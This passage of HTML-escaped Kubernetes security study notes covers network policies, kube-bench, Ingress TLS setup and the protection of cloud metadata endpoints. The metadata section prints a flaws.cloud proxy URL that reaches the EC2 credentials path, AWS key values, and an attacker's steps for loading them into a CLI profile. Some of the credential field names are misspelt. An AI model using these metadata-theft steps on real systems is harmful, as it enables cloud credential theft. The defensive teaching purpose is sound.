&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget: download timed out
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we&amp;rsquo;ll use the namespace label (orion) and pod label (frontend), and port 3000, and add them to the policy to be the only one who could talk to backend:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;networking.k8s.io/v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NetworkPolicy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend-ingress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  podSelector&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;    matchLabels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;      tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  policyTypes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;  - Ingress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  ingress&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;  - from&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;    - namespaceSelector&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;        matchLabels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;          app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;orion&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;      podSelector&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;        matchLabels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;          tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;    ports&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;    - protocol&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;TCP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;      port&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is how the network policy look like now:
Frontend &amp;ndash;&amp;gt; Backend , Port: 3000 ✅ Allow
Other &amp;ndash;&amp;gt; Backend ❌ Deny&lt;/p&gt;
&lt;h2 id=&#34;run-cis-benchmark-to-identify-security-risks-for-cluster-components&#34;&gt;Run CIS Benchmark to identify security risks for cluster components&lt;/h2&gt;
&lt;p&gt;To run CIS benchmark on Control Plane:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job-master.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 230627.png]]&lt;/p&gt;
&lt;p&gt;Upon Job execution, the corresponding Pod running the verification process can be identified by its name in the default namespace. The Pod’s name starts with the prefix kube-bench, then appended with the type of the node plus a hash at the end.&lt;/p&gt;
&lt;p&gt;Wait until the Pod transitions into the “Completed” status to ensure that all verifica‐ tion checks have finished. You can have a look at the benchmark result by dumping the logs of the Pod. A more convenient way would be to redirect logs to a file.&lt;/p&gt;
&lt;p&gt;To see pods in a different POV:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;minikube ssh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker ps
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;creating-an-ingress-with-tls-termination&#34;&gt;Creating an Ingress with TLS Termination&lt;/h2&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 132607.png]]&lt;/p&gt;
&lt;p&gt;It’s important to point out that the communication typically uses unencrypted HTTP network communication as soon as it passes the Ingress.&lt;/p&gt;
&lt;p&gt;Configuring the Ingress for HTTPS communication relieves you from having to deal with securing the network communication on the Service level. In this section, we will learn how to create a TLS certificate and key, how to feed the certificate and key to a TLS-typed Secret object, and how to configure an Ingress object so that it supports HTTPS communication&lt;/p&gt;
&lt;h3 id=&#34;deploy-service-and-pods&#34;&gt;Deploy service and pods&lt;/h3&gt;
&lt;p&gt;In the context of an Ingress, a backend is the combination of Service name and port. Before creating the Ingress, we’ll take care of the Service, a Deployment, and the Pods running nginx so we can later on demonstrate the routing of HTTPS traffic to an actual application. All of those objects are supposed to exist in the namespace t75. &lt;code&gt;t75.yml&lt;/code&gt; defines all of those resources as a means to quickly create the Ingress backend.&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 115911.png]]&lt;/p&gt;
&lt;p&gt;This command runs a one-off Pod named &lt;code&gt;tmp&lt;/code&gt; with the &lt;code&gt;busybox&lt;/code&gt; image. It does not automatically restart if the container exits and will be deleted after the command completes. Inside this Pod, it executes &lt;code&gt;wget&lt;/code&gt; to attempt a connection to the IP address &lt;code&gt;10.107.8.33&lt;/code&gt; on port &lt;code&gt;80&lt;/code&gt;, which is useful for testing network connectivity or checking if a web server is reachable from within the cluster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl run tmp --image&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;busybox --restart&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Never -it --rm -- wget 10.107.8.33:80
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.107.8.33:80 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.107.8.33:80&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;saving to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;index.html           100% |********************************|   &lt;span style=&#34;color:#ae81ff&#34;&gt;612&lt;/span&gt;  0:00:00 ETA
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt; saved
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pod &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tmp&amp;#34;&lt;/span&gt; deleted
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;create-tls-certificate-and-key&#34;&gt;Create TLS Certificate and Key&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$env:OPENSSL_CONF &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Program Files\Git\usr\ssl\openssl.cnf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl req -nodes -new -x509 -keyout accounting.key -out accounting.crt -subj &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/CN=accounting.tls&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This command generates a new self-signed TLS certificate and private key without encrypting the key. The certificate will have the Common Name (CN) set to &lt;code&gt;accounting.tls&lt;/code&gt;, and the files will be saved as &lt;code&gt;accounting.key&lt;/code&gt; and &lt;code&gt;accounting.crt&lt;/code&gt;, respectively.&lt;/p&gt;
&lt;p&gt;Here’s what each file is used for:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;accounting.key&lt;/code&gt;&lt;/strong&gt;: The private key used to sign the certificate.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;accounting.crt&lt;/code&gt;&lt;/strong&gt;: The self-signed certificate that can be used for SSL/TLS connections.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For use in production environments, you’d generate a key file and use it to obtain a TLS certificate from a certificate authority (CA). For more information on creating a TLS certification and key.&lt;/p&gt;
&lt;h3 id=&#34;creating-the-tls-typed-secret&#34;&gt;Creating the TLS-Typed Secret:&lt;/h3&gt;
&lt;p&gt;using kubectl will automatically base64 encode the tls certificate accounting.crt.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create secret tls accounting-secret --cert&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;accounting.crt key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;accounting.key -n t75
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or you can manually base64 encode it then put it on a yaml then apply the tls secret.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Secret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;accounting-secret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;t75&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes.io/tls&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;tls.crt&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk...&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# (Truncated base64-encoded certificate data)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;tls.key&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;LS0tLS1CRUdJTiBQUklWVRFIEtFWS0tLS0tCk...&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# (Truncated base64-encoded private key data)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This command will create a Kubernetes Secret named &lt;code&gt;accounting-secret&lt;/code&gt; in the &lt;code&gt;t75&lt;/code&gt; namespace. The Secret will contain the TLS certificate and private key that you generated earlier. This Secret can be used by Kubernetes resources like Ingress controllers or Pods to secure communications using SSL/TLS.&lt;/p&gt;
&lt;h3 id=&#34;create-ingress&#34;&gt;Create Ingress:&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-info&#34; data-lang=&#34;ad-info&#34;&gt;*Ingress*, *LoadBalancer*, and *NodePort* are all ways of exposing services within your K8S cluster for external consumption.

An ingress controller acts as a reverse proxy and load balancer inside the Kubernetes cluster. It provides an entry point for external traffic based on the defined Ingress rules. Without the Ingress Controller, Ingress resources won’t work.

The Ingress Controller doesn’t run automatically with a Kubernetes cluster, so you will need to configure your own. An ingress controller is typically a reverse web proxy server implementation in the cluster.
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f accounting-ingress.yml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 120222.png]]&lt;/p&gt;
&lt;p&gt;or with kubectl:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create ingress accounting-ingress &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;--rule&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;accounting.internal.acme.com/*=accounting-service:80, \ tls=accounting-secret&amp;#34;&lt;/span&gt; -n t75
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the port 443 is listed in the “PORT” column, indicating that TLS termination has been enabled.&lt;/p&gt;
&lt;p&gt;Creating an ingress object with no ingress controller in place will result in the following outpout:&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 123006.png]]&lt;/p&gt;
&lt;p&gt;your ingress object will not get an ip address.&lt;/p&gt;
&lt;p&gt;so we first need to create an ingress controller which will be type: LoadBalancer, then the ingress object will get an ip from this LB.&lt;/p&gt;
&lt;p&gt;to install the ingress controller:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.3.0/deploy/static/provider/cloud/deploy.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get service ingress-nginx-controller --namespace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 123146.png]]&lt;/p&gt;
&lt;p&gt;Now your ingress object will get an ip:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get ingress accounting-ingress -n t75 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NAME                 CLASS   HOSTS                          ADDRESS         PORTS     AGE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;accounting-ingress   nginx   accounting.internal.acme.com   10.102.150.36   80, &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;   10m
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or for more details on the ingress object, use describe:&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 123415.png]]&lt;/p&gt;
&lt;p&gt;add this line to your hosts file, for windows it&amp;rsquo;s on &lt;code&gt;C:\Windows\system32\drivers\etc\hosts&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.102.150.36 accounting.internal.acme.com 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 124233.png]]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Encryption Provided by TLS:&lt;/strong&gt; The TLS configuration in the Ingress resource only encrypts traffic from external clients to the Ingress controller.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Internal Communication (Service to Pod):&lt;/strong&gt; Within the Kubernetes cluster, communication between services and pods remains unencrypted unless additional measures are taken.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;securing-internal-communication-pod-to-pod&#34;&gt;Securing Internal Communication (Pod-To-Pod):&lt;/h4&gt;
&lt;p&gt;If you need to encrypt internal traffic between services and pods (e.g., for sensitive data or compliance reasons), consider the following options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mTLS (Mutual TLS):&lt;/strong&gt; Implement mTLS using tools like Istio or Linkerd to encrypt traffic within the cluster.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Service Mesh:&lt;/strong&gt; Deploy a service mesh like Istio to manage and enforce encryption policies for inter-service communication.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Pod-Level TLS:&lt;/strong&gt; Implement TLS directly in the applications running in your pods.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;protecting-node-metadata-and-endpoints&#34;&gt;Protecting Node Metadata and Endpoints&lt;/h2&gt;
&lt;p&gt;Kubernetes clusters expose ports used to communicate with cluster components. For example, the API server uses the port 6443 by default to enable clients like kubectl to talk to it when executing commands.&lt;/p&gt;
&lt;p&gt;Inbound control plane node ports:&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 135818.png]]&lt;/p&gt;
&lt;p&gt;Many of those ports are configurable. For example, you can modify the API server port by providing a different value with the flag &amp;ndash;secure-port in the configuration file &lt;code&gt;/etc/kubernetes/manifests/kube-apiserver.yaml&lt;/code&gt;, as documented for the cluster component. For all other cluster components, please refer to their corresponding documentation.&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 135919.png]]&lt;/p&gt;
&lt;p&gt;To secure the ports used by cluster components, set up firewall rules to minimize the attack surface area. For example, you could decide not to expose the API server to anyone outside of the intranet. Clients using kubectl would only be able to run commands against the Kubernetes cluster if logged into the VPN, making the cluster less vulnerable to attacks.&lt;/p&gt;
&lt;p&gt;Cloud provider Kubernetes clusters (e.g., on AWS, Azure, or Google Cloud) expose so-called metadata services. Metadata services are APIs that can provide sensitive data like an authentication token for consumption from VMs or Pods without any additional authorization&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 140112.png]]&lt;/p&gt;
&lt;p&gt;For example, In AWS, the metadata server can be reached with the IP address 169.254.169.254.&lt;/p&gt;
&lt;p&gt;This link for example is the metadata endpoint of an Ec2 Instance in aws &lt;a href=&#34;http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&#34;&gt;http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is how content would look like:&lt;/p&gt;
&lt;p&gt;![[Capture d’écran 2024-08-18 224321.png]]&lt;/p&gt;
&lt;p&gt;The attacker would then simply create a profile file under  &lt;code&gt;~/.aws/credentials/exploited-endpoint&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[exploited-endpoint]
aws_acces_key_id=ASIA6GG7PSQG6BYGNVKC
aws_secret_key_access=Hm2Bcnbgjy+fUUhnLRejnKGTl8AcoIDrNP/HZjfY
aws_session_token=IQoJb3JpZ2luX....
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;then run the following line to use this user when using aws cli to interact with the target.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export AWS_PROFILE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exploited-endpoint
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To prevent any Pod in a namespace from reaching the IP address of the metadata server, set up a network policy that allows egress traffic to all IP addresses except 169.254.169.254.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;networking.k8s.io/v1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NetworkPolicy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
